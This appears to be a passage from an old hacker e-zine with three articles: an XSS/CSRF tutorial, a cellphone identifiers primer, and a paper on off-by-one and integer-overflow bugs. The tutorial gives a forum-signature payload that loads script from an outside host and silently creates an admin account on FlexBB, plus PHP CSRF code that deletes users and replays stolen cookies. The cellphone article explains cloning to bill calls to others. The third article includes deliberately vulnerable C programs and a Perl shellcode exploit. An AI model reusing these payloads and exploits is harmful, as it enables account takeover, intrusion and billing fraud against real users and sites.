http_request = new XMLHttpRequest();\r\n  if (http_request.overrideMimeType) {\r\n    // Some versions of Mozilla get ..pissy..when the mimetype isnt xml\r\n     http_request.overrideMimeType('text/xml');\r\n   }\r\n } else if (window.ActiveXObject) {\r\n   try {\r\n     // IE has 2 different ways (versions of IE)\r\n     // of getting the XMLHttp object.\r\n    http_request=new ActiveXObject(\"Msxml2.XMLHTTP\");\r\n   } catch (e) {\r\n     try {\r\n     http_request = new ActiveXObject(\"Microsoft.XMLHTTP\");\r\n     } catch (e) {\r\n    }\r\n  }\r\n}\r\nif(!http_request){\r\n  // browser doesn't support the object..\r\n  alert('browser needs to DIE.');\r\n}\r\n      \r\n  It all may seem like a rush to you, but it is very simple. We're just checking\r\nwhat way we need to call the object. Since Internet Explorer is completely\r\nretarded, it has different ways to call it depending on the version. If it can't\r\nget the object at all, then it gives you an alert. For the sake of usablility,\r\nwe'll import this and everything we need into a function. This function will be\r\nable to send POST requests, and thus GET variables.\r\n\r\n  [code]\r\nvar http_request = false;\r\nfunction doPost(url, parameters) {\r\n  http_request = false;\r\n  if (window.XMLHttpRequest) {\r\n  // This is the way to ask for the XMLHttpRequest\r\n  // object in Mozilla, Safari, etc;\r\n  http_request = new XMLHttpRequest();\r\nif (http_request.overrideMimeType) {\r\n  // Some versions of Mozilla get ..pissy..when the mimetype isnt xml\r\n  http_request.overrideMimeType('text/xml');\r\n  }\r\n} else if (window.ActiveXObject) {\r\n  try {\r\n  // IE has 2 different ways (with different versions of IE) of getting the\r\nXMLHttp object. The next two are these\r\n  http_request=new ActiveXObject(\"Msxml2.XMLHTTP\");\r\n  } catch (e) {\r\n    try {\r\n      http_request = new ActiveXObject(\"Microsoft.XMLHTTP\");\r\n    } catch (e) {  }\r\n  }\r\n           }\r\n           if (!http_request) {\r\n           // either the browser is too old, doesn't support this, etc\r\n            document.write('hono!');\r\n            return false;\r\n           }\r\n           http_request.onreadystatechange = callBackFunc;\r\n           // We open link to our url\r\n           http_request.open('POST', url, false);\r\n           // The next 3 setRequestHeader()s are so we can use POST correctly\r\n           http_request.setRequestHeader(\"Content-type\",\r\n\"application/x-www-form-urlencoded\");\r\n           http_request.setRequestHeader(\"Content-length\", parameters.length);\r\n           http_request.setRequestHeader(\"Connection\", \"close\");\r\n           // Ok, send our shit now :-)\r\n           http_request.send(parameters);\r\n           }\r\n           function callBackFunc() {\r\n            if (http_request.readyState == 4) {\r\n                if (http_request.status == 200) {\r\n                    return true;\r\n                } else {\r\n                    return false;\r\n                }\r\n             }\r\n           }\r\nIf you need to only send GET parameters, you would use the function like so:\r\ndoPost('file.ext?get=vars', '');\r\nThis code with no extra whitespace that you can link to is located at\r\nhttp://dynxss.whiteacid.org/x.js.\r\n  \r\nOkay, so we've got our object working, and we want to start doing some really\r\ncool stuff, like making the admin create a new unrestricted account for you,\r\nright? Now it's time for a 'case study'. This is just a simple one, _very_\r\nsimple.\r\n\r\nFlexBB 0.5.5b cleaned new posts extraneously, but it didn't even check user's\r\nsignatures. It was possible to inject any code you wished, from 'defaces' to\r\nfull-blown 'you have been logged out, please log in' screens. So, I took a quick\r\nlook at the administration panel and figured out what I needed to create a new\r\nadministrator account. Luckily, since FlexBB is still in development, I didn't\r\nhave to parse for any hashes or anything.\r\n  So I had to send 5 variables. A username, the password, password check, email,\r\nand the level of access. I want admin, of course. But what happens when the\r\nadmin views this again? It will just keep 'attempting' to create the same user\r\nover and over... We could either use some random name making function or use an\r\noff-site list. Just so I didn't have to write even more code, I just decided to\r\nuse 'Math.floor(Math.random()*(n+1)'. So, I'd put something like:\r\n  var name = 'blah'+Math.floor(Math.random()*(n+1));\r\nAnd I'd usually have a new name every time. Most likely the administrator will\r\nnotice this, so we could write a function that is called before the user is\r\ncreated to check if an account has already been created with a specific name,\r\nbut we're doing this quick here. Anywho, so our code in our signature would look\r\nlike:\r\n  <script src=\"http://mysite.org/lib.js\"></script>\r\n  <script>var\r\nname='blah'+Math.floor(Math.random()*(n+1));doPost('flexbb/admin/users.php?com=\r\naddmember&do=addmember2',\r\n'&username='+name+'&password=fuyck&password2=fuyck&email=fuck@dude.org&position=\r\n4');</script>\r\n  \r\n\\x02 Using PHP for CRSF.\r\nI know you're thinking I'm weird at this point, but it can be done. All you\r\nreally need is a host that supports PHP.\r\nThe best thing about this is that it can be used with just a simple redirect\r\nfrom one page. So imagine that you link to an 'image' file that\r\nis really just a masked PHP file. It executes with either predefined intent or\r\ndynamic uses by GET variables.\r\n[1]. Predefined/Static.\r\n\r\n<?php header(\"Location: http://www.somesite.org/index.php?act=deluser&id=1\"); ?>\r\n\r\n[2]. Dynamic (call by something like <img\r\nsrc='http://mysite.org/img.jpg?s=site.org&p=ucp.php&g=op:edprof,content:i\r\nm%20so%20dumb'>)         (seems a bit complicated? lol.)\r\n\r\n$site = $_GET['s']; $page = $_GET['p']; $vars = $_GET['g']; $realvars =\r\nexplode(',', $vars); foreach($realvars as $rv){ $x = explode(':', $rv); $snd .=\r\n'&'.$x[0].'='.$x[1]; } header(\"Location: \".$site.\"/\".$page.\"?\".$snd);\r\nAlso, if you can send along document.cookie, you could do something like:\r\n$out = \"POST $page HTTP/1.1\\r\\n\"; $out .= \"Host: $host\\r\\n\"; $out .= \"Cookie:\r\n$cookie\\r\\n\"; $out .= \"User-Agent: $useragent\\r\\n\"; $out .= \"Content-length:\r\n\".(strlen($data)).\"\\r\\n\"; $out .= \"Connection: Close\\r\\n\"; $out .=\r\n\"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n$data\"; $fs =\r\nfsockopen($site, 80, $errno, $errstr, 0); fwrite($fs, $out); fclose($fs);\r\n\r\nAlthough these are not really practical approaches, as in the first example you\r\ncannot automate POST data, and the second will be defeated if the remote server\r\nchecks IP addresses (which isn't very common except among the likes of banks and\r\nsuch.)\r\n\r\n\\x03 Minor Bullshit\r\nThere are many XSS attacks that happen every day. Most are unsuccessful, because\r\nthey are just simple techniques that are extremely noticeable. Most of the time\r\nthis is either blatant stupidity, or the nature of the attack leaves it in plain\r\nsight. This is a big problem, because we don't want the administrator to notice\r\nsome wierd-ass fuckup on a page he's visiting, and look too much into it.\r\n\r\n################################################################################\r\n#                              Cellular Surpises                               #\r\n################################################################################\r\n\r\nSo You Missed the Wireless Revolution?\r\n\r\nEveryone is familiar with cellular phones and has at some point used a cellular\r\nphone. Most people in so-called civilized countries own cell phones and use them\r\nregularly. With such a widespread use there arise certain individuals who sport\r\ninterest in pushing these phones and their providers to their ultimate\r\nlimitations and asking that god-forsaken question: \"Just what can you do with a\r\ncell phone?\"\r\n\r\nWith their momentous rise in popularity, cell phone providers are forced to\r\nthink of new and unique options for their phones; what started out as a wireless\r\nutility for connecting individuals has evolved and been given new functions like\r\norganizers, gaming, text messaging, picture taking and built in cameras, ring\r\ntone downloading and much, much more. Indeed, with the apple iPOD compatible\r\nphone, recently developed by Apple and Motorola, the future looks bright for\r\nthis industry. The phone companies give so many options to phone users, most\r\nusers don't even realize that the phone may have abilities they are unaware of,\r\nmenus that could change the phone's functioning, passwords that would let them\r\nchange their number to whatever they want at any time. Fortunately, cellular\r\nentrepreneurs who realize the value of this information provide it in numerous\r\nonline references.\r\n\r\nWhen you get a cell phone, you're going to have a wireless cellular provider.\r\nNow, don't get the wireless provider confused with the phone's maker. You may\r\nhave a Nokia or Motorola, but your wireless provider could be Sprint, or worse\r\nyet, T-Mobile. Although T-Mobile does have decent roaming partners in terms of\r\nGSM. Just what are roaming partners? Well, we've got to understand what roaming\r\nis first. Now, let's say that my home service area is the state I live in. If I\r\nwere to go to say, Hawaii, I would no longer be in my home area. I would be\r\nroaming. When I'm roaming, I may be charged more for my calls. How do I know my\r\nhome area? It'll be listed in the phone plan. There is no set distance that a\r\nhome area covers. It can be a city, a state, the whole country. Your home area\r\nis defined by whatever rate plan you use. That rate plan will also define your\r\nroaming charge. Sometimes you'll need to pay a bit extra, other times the\r\nprovider just won't have a roaming charge. Providers will always try to get a\r\nwide network of roaming partners. If I go to France, my provider may not cover\r\nthat area. If the provider has no roaming partners in France, I'm out of luck, I\r\nwon't get any service. However, if my provider is say, T-Mobile, I will be\r\nperfectly fine. They have a partnership with Bouygues Telecom, a French provider\r\nwith national coverage.\r\n\r\nWell, what is it that makes a cell phone unique? In addition to its phone number\r\n(MIN) each phone has its own electronic serial number (ESN), factory set on\r\nevery phone. It's engraved into a memory chip called Programmable Read Only\r\nMemory (PROM), Erasable Programmable Read Only Memory (EPROM), or Electronically\r\nErasable Programmable Read Only Memory (EEPROM). EPROM and EEPROM are the most\r\ncommonly used. To find your ESN, either take out your phone's battery, inside\r\nthere should be some sort of information sticker, called a compliance plate,\r\nwith your ESN listed or dial *#06#. If not, check for an International Mobile\r\nEquipment Identity (IMEI) number. IMEI means that your phone is connected\r\nthrough the Global System for Mobile Communications (GSM), which is quite\r\npopular by the way, besides being the standard for Europe and Asia and owning\r\nabout 80% of the wireless market. Code Division Multiple Access (CDMA) is the\r\nU.S. attempt at equaling GSM. There's an argument out there about which is\r\nbetter, GSM or CDMA. It's a fairly interesting argument with good points on both\r\nsides. GSM is used by companies like AT&T, Cingular and T-mobile, while CDMA is\r\nfavored by Verizon and Sprint; they're roaming partners, and Alltel. Some say\r\nGSM has worse audio quality than CDMA, but that depends on a number of factors.\r\nPersonally, I prefer GSM, but it's your choice.\r\n\r\nSo anyway, back to ESN. The ESN is an 11 digit identification number format\r\nxxxxxxxxxxx. That looks pretty ugly, so I'm going to cut it into 3 parts,\r\nxxx-xx-xxxxxx. The first part is the manufacturer's decimal code. It's a 3 digit\r\ncode which tells you who made your phone. The next 2 digits are reserved. And\r\nthe last 6 digits are the phone's serial number (SNR) uniquely assigned to each\r\nphone.\r\n\r\nWith GSM you have an IMEI code. An IMEI code is a unique 15 digit identification\r\nnumber formatted: either xxxxxx-xx-xxxxxx-x or xxxxxxxx-xxxxxx-x depending on\r\nthe phone's production date, before or after January 1, 2003. The first 6/8\r\ndigits are the type approval/allocation code (TAC). This shows where the type\r\napproval/allocation was sought for the phone. The first 2 digits in this number\r\nrepresent the country code. I shouldn't need to say this, but just in case, the\r\ncountry code is the same for both wired and wireless telecommunications. The\r\nsecond group of numbers is the Final Assembly Code (FAC) and used to identify\r\nthe manufacturer.\r\n\r\nHowever, a procedure set January 1, 2003 makes the FAC obsolete, setting it at\r\n00 until April 1, 2004 when it is no longer included. Because of the new\r\nprocedure, the TAC was expanded to 8 digits. The third group is the 6 digit\r\nSerial Number (SNR). Finally, the last group is the Check Digit (CD) used to\r\ncheck the code for its validity. It's a checksum to prevent IMEI tampering. The\r\nCD only applies to phones of Phase 2 and higher, Phase 1 GSMs have an automatic\r\n0 for the CD. An International Mobile Equipment Identity and Software Version\r\n(IMEISV) number is sometimes used. It gives you the phones original software\r\nnumber by adding a 2 digit Software Version Number (SVN) at the end of the code.\r\nSo the number format is changed to xxxxxxxx-xxxxxx-x-xx.\r\n\r\nFurther information on your phone is contained in the Subscriber Identity Module\r\n(SIM) card. The SIM card originally started out on GSM phones, but CDMA saw the\r\nusefulness of the card and promptly began implementing it as well. GSM's cards\r\nare still superior though. When you turn on your phone and try to access its\r\nfeatures too early, you may get a message like \"Reading SIM\", or if you dial a\r\nnumber stored in your phonebook without going through the phonebook, it may not\r\nlist the name of the person you're calling. That's because phonebook information\r\nsuch as numbers and missed calls is, usually by default, stored on your SIM.\r\nNow, technically, SIM is not really the card itself. SIM refers to a Universal\r\nIntegrated Circuit Card (UICC) with an SIM application that stores phone numbers\r\nand text messages. Among other things, it can also store memos and Internet\r\nbrowser bookmarks for those with wireless Internet phone access.\r\n\r\nThe SIM card also contains several numbers that identify it and the customer\r\nthat uses it. First is the International Mobile Station Identity (IMSI) number.\r\nThe IMSI number is a unique 15 digit identification number that identifies GSM\r\nand Universal Mobile Telecommunications System (UMTS) network mobile phone\r\nusers. UMTS is a third generation mobile phone system, as apposed to GSM which\r\nis second generation. Originally, UMTS phones were incompatible with GSM but as\r\nof 2004, UMTS phones have been dual UMTS/GSM, allowing them to continue\r\nfunctioning in a UMTS unsupported area. UMTS has also been called W-CDMA, this\r\nisn't exactly true since UMTS only uses W-CDMA's air interface, transmission\r\nbetween phones and towers, while using GSM's Mobile Application Part (MAP) core,\r\nthe protocol providing mobile functions like call routing and GSM's speech\r\ncodecs. The equivalent of the SIM on UMTS is the USIM or Universal Subscriber\r\nIdentity Module.\r\n\r\nDon't go getting the IMSI and the IMEI confused. They're both 15 digit\r\nidentification numbers, however, IMEI is for your phone, and IMSI is for your\r\nSIM. The IMEI will be printed on an information sticker under the battery of\r\nyour phone, and you can also bring it up by using the standard IMEI code *#06#.\r\nThe IMSI will be printed on your SIM card. Often the formatting will be\r\nxxxxxxxxxxxxxxx. Like the IMEI, this number can be taken apart. If we divide it\r\ninto portions, the formatting becomes xxx-xx(x)-xxxxxxxxx(x). Why are an x in\r\npart two and an x in part three in parenthesis? The first set of three digits is\r\nyour Mobile Country Code (MCC). There is a special set of IMSI specific country\r\ncodes. The next set can be either two or three digits, depending on where you\r\nlive: two digits in Europe, three in North America. This is the Mobile Network\r\nCode (MNC) which tells you what mobile network you're using. The final set which\r\ncan be nine or ten digits is the Mobile Station Identification Number (MSIN)\r\nwhich uniquely identifies you as a network's subscriber.\r\n\r\nThe MCC and MNC come together with the Local Area Code (LAC) to form the\r\nLocation Area Identity (LAI). Before we can talk about LAIs we have to define\r\none more term, that being the Public Land Mobile Network (PLMN) or just GSM\r\nphone network. The information transmission for cellular phones is focused\r\naround cellular towers, which of course use radio waves. PLMNs refer to all\r\nwireless networks that use radio transmission involving land based radio\r\ntransmitters or radio base stations, so wireless phone services, wireless\r\ninternet services, and so on. An LAI is an identifying code transmitted from all\r\ncellular towers that allows a cellular phone to select the tower with the\r\nstrongest signal. You might have a single signal bar showing on your phone, and\r\nsuddenly it jumps to five. Your phone just switched to a different network with\r\na stronger signal.\r\n\r\nThe last thing I'll mention relating to SIMs is the International Circuit Card\r\nID (ICCID), which is a number that identifies your UICC.\r\n\r\nOn a final note, what if my antenna signal is low, a one for example, and my\r\nphone just won't switch networks. For a while now, a bunch of companies have\r\nbeen selling little golden circuit stickers that you can attach to the inside of\r\nyour phone, under the battery, and \"boost your antenna signal\". These boosters\r\nsell for around $20 in stores and they are bogus, they are a piece of trash and\r\na waste of money. The older ones are rectangular; I know Just Wireless is coming\r\nout with little square ones now because the old ones are too big to fit on\r\npractically all the flip phones. Adding a little golden circuit sticker to the\r\ninside of your phone will in no way boost your antenna signal; it's just some\r\nstupid money making scam that you should under no circumstances fall for. If\r\nyour antenna signal is extremely low and you're moving, it should rise within a\r\nfew minutes. If not you can always manually change networks; most phones have an\r\noption that allows you to search for available networks and select one yourself.\r\n\r\nWith so many people using cell phones, naturally there are people who want to\r\npush the limits of cellular law with a number of inventive ideas. Now, I'm just\r\ngoing to mention these applications, not go into detail on them. First we have\r\nscanners, largely considered either a load of fun or unlawful under the\r\nElectronic Communications Privacy Act. What are scanners? Plain enough, scanners\r\nlet you listen in on other conversations. You can buy scanners for ridiculous\r\nprices, usually hundreds of dollars, or you could just make your own with one of\r\nseveral old cell phone models. Next, we have cellular cloning. Cloning makes it\r\nso one phone mimics another. By copying a phone's MIN and ESN you can clone it.\r\nSay I copy the ESN and MIN of phone A to phone B. Then phone B will ring when\r\nphone A rings, and all charges from phone B will be billed to phone A allowing\r\nme to make free calls while someone else pays the bills. The phone's ESN and MIN\r\nare stored in the Number Assignment Module (NAM). The NAM will be a PROM, EPROM\r\nor EEPROM chip; you guess which is easiest to clone. Next, let's mention\r\nunlocking. This is probably the most common thing people do to cell phones. When\r\na cell phone is locked it means you can only use it with a certain wireless\r\nprovider's SIM cards. To unlock the phone you have to enter a code, the code\r\nvaries from phone to phone. Usually you can just call up your provider and ask\r\nthem for the unlock code, but you can also find them in a variety of online\r\npublications. On another note, you remember those menus I mentioned at the start\r\nof the text? Well, they certainly exist. Each phone has at least one menu that\r\ncontains anything from pixel tests to security settings specifically for\r\nwireless providers, not consumers. These menus can be accessed by entering menu\r\ncode, which like the unlock code, varies from model to model. Finally, we've got\r\ncell phone jammers. This is a cellular DoS attack on a surrounding area. Cheaper\r\njammers can be set to a certain frequency; the more expensive ones operate on a\r\nrange of frequencies. By emitting a signal on the same frequencies as analog and\r\ndigital cell phones, the signals are effectively canceled out. Did I mention\r\nthat scanning, cloning and jamming are illegal?\r\n\r\nA complete works cited for this article is available online. I'll include a two\r\nuseful links. First is GSM World at www.gsmworld.com. The format of this site is\r\nreally nice, my favorite part of this site is GSM Roaming, which shows you\r\nroaming information for any GSM provider in any country in the world, it's great\r\nif you travel a lot and need reliable roaming coverage. Second, Cell Reception\r\nover at www.cellreception.com. They've got the lowdown on all the latest phone\r\nmodels and a listing of cellular phone towers anywhere in the US. They also have\r\na listing of cellular dead spots which are areas with no service usually due to\r\nMother Nature, not cell phone jammers.\r\n\r\nPeace, ~Br0kenKeychain~\r\n\r\n################################################################################\r\n#                            Exotic Vulnerabilities                            #\r\n################################################################################\r\n(code and other files associated with nomenumbra's article are located at\r\nhttp://www.hackbloc.org/zine/vivalarevolution.rar - pass is 'anarchism')\r\n\r\nIntro:\r\nWell, this small paper will be discussing two exotic vulns that are getting more\r\nand more common, or actually more common knowledge. When b0fs where starting to\r\nhit the scene back in the days of Aleph1 they were extremely common in most apps\r\n(and still are in some), but more and more coders are getting aware of these\r\nsecurity risks and are doing boundschecking and are taking other measures. Well,\r\nthese 'protections' can often be circumvented in very silly ways, trough often\r\nneglected and misunderstood bugs. I will be discussing off-by-one errors and\r\ninteger overflows in this paper.\r\n\r\nOff-by-one errors:\r\nI'm discussing off-by-one errors here, for those who don't know what an\r\noff-by-one error is, here is a short description from wikipedia:\r\n\r\n\"An off-by-one error in computer programming is an avoidable error in which a\r\nloop iterates one too many or one too few times. Usually this problem arises\r\nwhen a programmer fails to take into account that a sequence starts at zero\r\nrather than one, or makes mistakes such as using \"is less than\" where \"is less\r\nthan or equal to\" should have been used in a comparison.\"\r\n\r\nExample:\r\nImagine the coder would want do preform an action on elements m to n of an array\r\nX, how would he calculate how many element would he have to process? Some would\r\nanswer n-m, which is ...\r\nWRONG. This example is known as the \"fencepost\" error (the famous maths\r\nproblem). The correct answer would be n-m+1. See the following code:\r\n\r\nfor(int i = 0; i < (n-m); i++)\r\nDoSomething(X[i+m]);\r\n\r\nthe coder might think he would preform the action over elements m to n of X but\r\nactually he preforms them over m to n-1.\r\n\r\nSo it's actually the result of a shit-ass coder? Well, it is, but an off-by-one\r\nbug is made more often than you think. Often hidden deep within a vulnerable\r\napp, and not quite as obvious as the given examples. The following app is an\r\nexample (totally useless) app that features 3 vulns that can, when combined,\r\nlead to system compromise.\r\n\r\n#include <cstdlib>\r\n#include <iostream>\r\n#define UserCount 2\r\n\r\nusing namespace std;\r\n\r\nstruct UserStruct {\r\nchar* Username;\r\nchar* Password;\r\nint Access;\r\n}; // lame 'user' structure\r\n\r\nUserStruct UserArray[UserCount]; // array\r\n\r\nvoid LameFunc(char* Data) // some lame no-good function\r\n{\r\nchar buffer[10];\r\nstrcpy(buffer,Data); // extremely simple b0f for demonstration purposes lol\r\nreturn;\r\n}\r\nvoid SomeLoop(int Times,char* Data)\r\n{\r\n// The coder thinks that if Times is 0, the loop won't run since while(Times >\r\n0) will be false\r\n// the loop will however run at least 1 time, because of the Do statement, so\r\nthis is off-by-one\r\n// this kind of error occurs quite often, but less obvious ofcourse\r\ndo {\r\nLameFunc(Data);\r\nTimes--;\r\n} while (Times > 0);\r\n}\r\n\r\nvoid Initialize() // initialize the 'users' which may only have numeric\r\nusernames and passwords\r\n{\r\nUserArray[0].Username = \"123\";\r\nUserArray[0].Password = \"321\";\r\nUserArray[0].Access = 9; // number of times their loop will run\r\nUserArray[1].Username = \"456\";\r\nUserArray[1].Password = \"654\";\r\nUserArray[1].Access = 1;\r\n}\r\n\r\nbool IsNoShellcode(char* Data) // checks if Data is numeric only\r\n{\r\nfor(int i = 0; i < strlen(Data); i++)\r\nif (((int)Data[i] > 57) || ((int)Data[i] < 48))\r\nreturn false;\r\nreturn true;\r\n}\r\n\r\nint Auth(char* User,char* Passwd) // checks if user and password are authed, if\r\nso it returns the //number of times their loop will run, else it will return 0\r\nsince the coder is under the false //assumption the loop won't run at all if\r\nTimes is 0\r\n{\r\nfor (int i = 0; i < UserCount; i++)\r\n{\r\nif((strcmp(UserArray[i].Username,User) == 0) &&\r\n(strcmp(UserArray[i].Password,Passwd) == 0))\r\nreturn UserArray[i].Access;\r\n}\r\nreturn 0;\r\n}\r\n\r\nint main(int argc, char *argv[])\r\n{\r\nif (argc != 4)\r\n{\r\nprintf(\"[?]Lameapp v1.0\\nUsage: %s username password data\\n\",argv[0]);\r\nexit(-1);\r\n}\r\nInitialize();\r\n//'Sanitize' input\r\nfor(int i = 0; i < (3-1); i++) // The coder thinks this will loop from 1 to 3,\r\nbut it will only loop //from 1 to 2 (fencepost error)\r\nif(!IsNoShellcode(argv[i+1])) // 'avoid' shellcode in the buffers\r\nexit(-1);\r\nSomeLoop(Auth(argv[1],argv[2]),argv[3]);\r\nreturn 0;\r\n}\r\n\r\nOk, I hear everyone thinking WTF?! What is the PURPOSE of this app, good guess,\r\nnone, it's totally useless, but hey, it's an example and so is most software\r\nnowadays. The apps works as follows:\r\n\r\nlameapp.exe username password data\r\n\r\nAssuming we can't read the passwords (we can't do DLL-injection on the app, we\r\ncan't reverse it,etc just ASSUME it for a second ) we don't have a valid login,\r\nwhich is nothing to worry about, because the loop will run anyway, even if we're\r\nunauthentificated (because of the do { } while off-by-one error). Then the\r\nprogrammer tries to prevent shellcode being 'stored' in either of the arguments\r\n(instead of just coding secure) by \"sanitizing\" the arguments, but the\r\nsanitizing routine is off by one, since not elements m trough n are processed\r\nbut m trough n-1. Thus leaving the last argument argv[3] unsanitized, to store\r\nour data. I know, this example is TOO obvious, but it is an illustration to\r\noff-by-one errors. So exploiting this bitch wouldn't be hard. Assuming you know\r\nhow to exploit buffer overflows on the windows platform (if you don't read\r\neither Tonto's articleb0f_1 or mineb0f_2 ) the exploit would look as follows:\r\n\r\n#!/usr/bin/perl\r\nmy $ShellCode = \"\\x33\\xc0\\xeb\\x16\\x59\\x88\\x41\\x04\\x50\\x51\\x51\\x50\\\r\nxb8\\x24\\xe8\\xd3\\x77\\xff\\xd0\\xb8\\x63\\x9\r\n\r\n\r\n8\\xe5\\x77\\xf f\\xd0\\xe8\\xe5\\xff\\xff\\xff\\x68\\x69\\x32\\x75\\x4e\";\r\n\r\nmy $TargetApp = \"C:\\\\lameapp\";\r\nmy $OverflowString = \"\\x90\"x28;\r\n\r\nmy $JMPESP = \"\\x24\\x29\\xD8\\x77\";\r\nmy $XploitStr = $TargetApp.\" 666 666 \".$OverflowString.$JMPESP.$ShellCode;\r\nsystem($XploitStr);\r\n\r\nStack Frame pointer overwriting:\r\n\r\nAnother interesting case of off-by-one is stack frame pointer overwriting,\r\ndocumented by Klog (http://www.phrack.org/phrack/55/P55-08). I'll describe the\r\nbasic aspects in a windows situation (yeah yeah call me names already) here.\r\nImagine a situation of the worst case, a buffer overflow in which you can only\r\noverflow with ONE byte (off-by-one), how could this lead to us influencing the\r\ncode execution of the app? That'll be discussed here.\r\nThere are some differences between the linux (discussed by Klog) and windows\r\nvariant, with the windows variant having some drawbacks over the linux one.\r\nThere are a multitude of possible situations when it comes to stack frame\r\npointer overwriting, every situation having it's own unique traits. Since this\r\nis a 'worst case scenario' exploit, exploitation will be quite difficult at\r\ntimes.\r\n\r\nOk imagine (or just read ;p) this situation:\r\n\r\n#include <stdio.h>\r\n#include <cstdlib>\r\n#define BUFFSIZE 1024\r\nint main(int argc, char *argv[])\r\n{\r\nchar buff[BUFFSIZE];\r\nfor (int i = 0; i <= BUFFSIZE; i++)\r\n*(buff+i) = argv[1][i];\r\nreturn 0;\r\n}\r\n\r\nWell, some people will say, what's the problem mate, you just take up till\r\nBUFFSIZE, so all fits nicely! Well, upon closer examination they will be proven\r\nwrong because the loop is off-by-one (because of the <= instead of just <). So\r\nwe have an overflow of exactly ONE byte, what's that gonna help us? Well, for an\r\nanswer to that let's look at the layout of the stack with such an app:\r\n\r\nsaved_eip\r\nsaved_ebp\r\nchar buffer[255]\r\nchar buffer[254]\r\n...\r\nchar buffer[000]\r\nint i\r\n\r\nso if we overflow buffer with one byte, the last byte of the DWORD of the saved\r\nebp will be overwritten, thus we can trick the program into believing the\r\noriginal EBP (saved in the function prologue: push EBP, MOV EBP,ESP) is our\r\n(partially) overwritten value.\r\n\r\nThis action being followed by the function epilogue:\r\n\r\nmov ESP,EBP\r\nadd ESP,4\r\npop EBP\r\n\r\n(which is also LEAVE).\r\n\r\nNow, we want ESP to point to the address of our shellcode (located in the\r\noverflowing buffer), so since ESP will be EBP+4 so saved EBP should be the\r\naddress of our shellcode, 4. Since we cannot control the third byte of the saved\r\nebp , we can't make ESP hold the address of the start of our buffer, so we\r\nshould fill it with nops till the address we can make ESP hold.\r\n\r\nWell when researching this vuln, I found some weird difference between\r\ncompilers. When compiled with VC6 or gcc, there seems to be no problem or\r\ndifference, but when compiled with Mingw, there is a problem which I'll discuss\r\nin a minute.\r\nNow take this app:\r\n\r\n#include <stdio.h>\r\n#include <cstdlib>\r\n#define BUFFSIZE 1024\r\n\r\nvoid Funk(char* bf)\r\n{\r\nchar buff[BUFFSIZE];\r\nfor (int i = 0; i < (BUFFSIZE+9); i++)\r\n*(buff+i) = bf[i];\r\n}\r\nint main(int argc, char *argv[])\r\n{\r\nFunk(argv[1]);\r\nreturn 0;\r\n}\r\n\r\nThis app differs from the first in one major concept, it doesn't do the real\r\nfor(i = 0; i <= BUFFSIZE; i++) what makes it off-by-one, but instead it will\r\ncopy till BUFFSIZE+9. This is because I first compiled my app with mingw, making\r\nthe stack layout look like:\r\n\r\nsaved_eip\r\nsaved_ebp\r\n[Mr-x DWORD]\r\n[Mr-x DWORD]\r\nchar buffer[255]\r\nchar buffer[254]\r\n...\r\nchar buffer[000]\r\nint i\r\n\r\nthere are two DWORDs of unknown purpose between our buffer and the saved EBP. I\r\nfirst suspected them to be canary values, but since their content is static,\r\nthat's bullshit. I will talk about this later. As I already told you, there are\r\nno such problems with VC6 or Gcc, this seems to be a mingw problem (thanks to\r\nTonto for verifying this).\r\n\r\nThe routine Funk (for a Mingw compiled program) looks like this when\r\ndisassembled:\r\n\r\n00401290 /$ 55 PUSH EBP\r\n00401291 |. 89E5 MOV EBP,ESP\r\n00401293 |. 81EC 18040000 SUB ESP,418\r\n00401299 |.

And this will eventually overwrite the last byte of the saved ebp\r\n(in the case of a mingw compilation with the byte at position (1024 + 9) else\r\nwith the byte at position (1024 + 1) inside argv[1]). Now look at a part of the\r\ndisassembled Main:\r\n\r\n0040130D |. E8 7EFFFFFF CALL a.00401290\r\n00401312 |. B8 00000000 MOV EAX,0\r\n00401317 |. C9 LEAVE\r\n00401318 \\. C3 RETN\r\n\r\nOk, now take a carefull look at the registers as we move trough our apps'\r\nexecution:\r\n\r\nBefore the LEAVE in Funk, EBP is 0x0022FF58 (points to saved_ebp) after the\r\nLEAVE,EBP is 0x0022FF<overflowing byte here> (while it should be 0x0022FF78) and\r\nESP is changed 0x0022FF5C ( 0x0022FF58 + 4). Now if we continue execution until\r\njust after Main's LEAVE (in the example at 0x00401317) we can see that ESP is\r\nnow 0x0022FF<overflowing byte + 4), and EIP will be popped from that address, so\r\nwe have our exploitable condition! Our initial overflowing buffer should look\r\nlike:\r\n\r\nIn case of a mingw compilation:\r\n[\"\\x90\"x1024] + [\"\\x90\" x 8] + [overflowing byte]\r\nIn case of a gcc compilation:\r\n[\"\\x90\"x1024] + [overflowing byte]\r\n\r\nNow we should let the overflowing byte point somewhere in the middle of our\r\nbuffer. Keep in mind that that byte will be increased with 0x04 though in ESP.\r\nIn this case 0x01 should suffice, becoming 0x05 in ESP.\r\n\r\nThen, at that address (in our buffer: 0x0022FF05) we should have the address of\r\nthe start of our shellcode, that will be popped into EIP. So we should have the\r\nfollowing exploitation buffer:\r\n\r\n[Shellcode][addr of Shellcode][overflowing nops (if necessary)][overflowing byte\r\npointing to the addres of [addr of Shellcode]]\r\n\r\nThere is are several issues with this exploitation method on windows though. Due\r\nto buff being declared in Func, it might have it's data partially overwritten\r\n(due to windows' relative addressing method), rendering this exploit useless. I\r\ntold you there are some major differences in exploitation on windows and linux\r\n(as always >.>) and this is a large drawback because we this REALLY makes this a\r\nworst case scenario. The other (and probably biggest) drawback are the two\r\nstrange DWORDs between the saved EBP and our buffer on a Mingw compilation. This\r\nmeans we must be very careful at looking what compiler what used to compile the\r\napp before drawing conclusions about potential exploitable content.\r\n\r\nInteger overflows:\r\n\r\nInteger overflows are misunderstood bugs. They are relatively rare, but not in\r\nthe sense of occurance but in the sense of discovery. They are often overlooked\r\nor just neglected due to the lack of exploitation knowledge. Well, integer\r\noverflows basically consist of increasing an integer beyond it's maximum\r\ncapacity, thus sometimes causing exploitatable behavior. Ok, look at the\r\nfollowing min and max value table of several data types:\r\n\r\nSo, let's look at the next aritmetic example:\r\n\r\nint main(int argc,char* argv[])\r\n{\r\nbyte a = 0xFF;\r\na += 0x1;\r\nreturn 0;\r\n}\r\n\r\nrunning this app in a debugger would reveal to us what you might have suspected.\r\nSince 0xFF is 255 but also (in case of an unsigned 8-bit value) -1. So adding 1\r\nto 0xFF (being the max value of a byte) makes -1 + 1 = 0. This can be abused for\r\nour own purposes. Imagine the following app vulnerable to a simple b0f:\r\n\r\nint main(int argc,char* argv)\r\n{\r\nchar buffer[20];\r\nif(argc != 3)\r\nexit(-1);\r\nint i = atoi(argv[2]);\r\nunsigned short s = i;\r\nif (s > 19) // 'prevent' 